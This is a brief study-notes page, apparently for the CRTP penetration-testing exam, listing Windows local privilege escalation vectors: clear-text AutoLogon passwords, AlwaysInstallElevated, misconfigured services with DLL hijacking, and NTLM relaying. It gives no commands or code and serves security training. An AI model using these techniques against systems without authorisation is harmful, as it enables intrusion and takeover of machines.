# Local Privilege Escalation

{% hint style="info" %}
The CRTP exam consists of 5 target servers in addition to a foothold student machine.\
The goal is to OS level command execution on all 5 targets not matter what the privileges of the user.
{% endhint %}

## Vectors

#### There are various ways of locally escalating privileges on Windows box:

* Missing patches – Automated deployment and AutoLogon passwords in clear text
* AlwaysInstallElevated (Any user can run MSI as SYSTEM)
* Misconfigured Services – DLL Hijacking and more
* NTLM Relaying a.k.a. Won't Fix

This guide offer a sufficiently comprehensive overview of the course material for local privilege escalation
